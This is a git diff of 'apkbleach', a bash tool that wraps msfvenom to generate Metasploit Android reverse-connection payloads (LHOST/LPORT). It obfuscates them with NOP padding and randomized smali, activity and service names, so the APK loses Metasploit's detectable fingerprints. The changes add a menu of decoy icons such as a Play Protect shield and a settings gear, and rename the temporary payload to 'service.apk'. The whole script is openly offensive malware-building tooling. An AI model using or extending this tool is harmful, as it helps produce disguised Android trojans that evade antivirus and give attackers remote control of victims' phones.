@@ -3,7 +3,7 @@
 # Author: graylagx2
 # Version: 1.0
 # Description: This script will remove the obvious fingerprints of metasploit through out a given apk file.
-# Contact: graylagx2@unseen.is
+# Contact: graylagx2@gmail.com
 
 RED=$'\e[1;31m'
 GREEN=$'\e[1;32m'
@@ -40,19 +40,18 @@ USAGE() {
     echo -e "${GREEN}Usage:${RESTORE} apkbleach ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use> ${YELLOW}-i${RESTORE}  <path/to/image.png> ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>\n
 ${GREEN}Options:${RESTORE}
   ${YELLOW}-g${RESTORE}  <android/payload/to/use LHOST=ip-address-to-use LPORT=port-to-use>
-      
-                              Generates obfuscated payload with nops
-  ${YELLOW}-i${RESTORE}  <path/to/image.png>
-      
-                              Sets image.png as the icon of the file.apk
+      ${YELLOW}Generates obfuscated payload with nops${RESTORE}
+  
+  ${YELLOW}-i${RESTORE}  <path/to/image.png> [ use -i --list ] to list defaults
+      ${YELLOW}Sets image as the icon of the file.apk${RESTORE}
+  
   ${YELLOW}-o${RESTORE}  <path/to/outputname.apk>
-      
-                              Sets the name of custom output file
+      ${YELLOW}Sets the name of custom output file${RESTORE}
+  
   ${YELLOW}-x${RESTORE}  <path/to/apk>
-      
-                              Uses pre generated metasploit payload to obfuscate  
-  ${YELLOW}-h${RESTORE}
-                              Help menu
+      ${YELLOW}Uses pre generated metasploit payload to obfuscate${RESTORE}  
+  
+  ${YELLOW}-h${RESTORE} ${YELLOW}Help menu${RESTORE}
 ";exit
 }
 [[ $# -eq 0 ]] && bash $0 -h && exit
@@ -98,6 +97,10 @@ while test $# -gt 0; do
         -i)
                 shift
                 if [ $# -gt 0 ]; then
+                  if [ $1 = "--list" ]; then
+                      echo -e "${YELLOW}ICONS: \n\nICONS/4g_signal.png\nICONS/settings.png\nICONS/signal.jpg\nICONS/secure.png\nICONS/android_studio.png\nICONS/play_protect.png"
+                      exit
+                  fi
                     export ICON_PATH=$1
                 else
                     echo -e "${RED}ERROR: ${YELLOW}Input png image not set${RESTORE}"
@@ -122,12 +125,21 @@ echo '
            l__j__l__j  l__j\_l_____l_____l_____l__j__j\____l__j__j'                                                                     
 echo -e "\n${YELLOW}                        Version: ${BLUE}1.0 ${YELLOW}Author: ${BLUE}graylagx2${RESTORE}\n"
 
+# Variables to rename directories, files or pathways in apk
+M_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+S_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+P_SMALI_FILE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_ACTIVITY=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_SERVICE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIN_BROADCAST_RECEIVER=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+MAIFEST_SCHEME=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
+
 if [ ! -z $PAYLOAD ] && [ ! -z $LHOST ] && [ ! -z $LPORT ]; then
-    (msfvenom -p "$PAYLOAD" "$LHOST" "$LPORT" --pad-nops R &>/dev/null > /tmp/BleachMe.apk || $(echo -e "${RED}ERROR${RESSTORE} msfvenom failed checks options"; exit)) & 
+    (msfvenom -p "$PAYLOAD" "$LHOST" "$LPORT" --pad-nops R &>/dev/null > /tmp/service.apk || $(echo -e "${RED}ERROR${RESTORE} msfvenom failed checks options"; exit)) & 
     PROG_MESSAGE="Generating $PAYLOAD payload"
     COMP_MESSAGE="Generated $PAYLOAD payload"
     spinLoader;echo
-    APP_PATH=/tmp/BleachMe.apk
+    APP_PATH=/tmp/service.apk
     [[ -n $EXPORT_PATH ]] && APP_NAME=$OUTPUT_NAME || APP_NAME=$(basename $APP_PATH)
 else 
     [[ -n $APP_PATH ]] && APP_NAME=$(basename $APP_PATH) || exit
@@ -150,17 +162,6 @@ if [ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]; then
    APP_PATH=$(zenity --title="$APP_PATH is not a valid  PATH or APK please select a valid apk file." --file-selection || echo -e "ERROR: No selection")
    [[ $(zip -T $APP_PATH &>/dev/null; echo $?) != 0 ]] && echo -e "${RED}ERROR: ${YELLOW}Not valid APK.${RESTORE}" && exit
 fi
-
-# Variables to rename directories, files or pathways in apk
-
-M_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-S_SMALI_DIR=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-P_SMALI_FILE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-MAIN_ACTIVITY=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-MAIN_SERVICE=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-MAIN_BROADCAST_RECEIVER=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-MAIFEST_SCHEME=$(sort -R /usr/share/dict/words | head -1 | cut -d"'" -f1)
-
 
 # Decompile apk
 (apktool -q d $APP_PATH -o /tmp/apkbleach/Decompiled; sleep 3) &
@@ -228,7 +229,7 @@ spinLoader;echo
 [[ -z $EXPORT_PATH ]] && EXPORT_PATH=$(pwd)
 
 (mv --backup=t /tmp/apkbleach/$APP_NAME /tmp/apkbleach/${APP_NAME%%.*}.keystore -t $EXPORT_PATH; 
-rm -rf /tmp/apkbleach /tmp/BleachMe.apk;
+rm -rf /tmp/apkbleach /tmp/service.apk;
 sleep 3) &
 PROG_MESSAGE="Moving $APP_NAME and ${APP_NAME%%.*}.keystore to $EXPORT_PATH"
 COMP_MESSAGE="Moved $APP_NAME and ${APP_NAME%%.*}.keystore to $EXPORT_PATH"
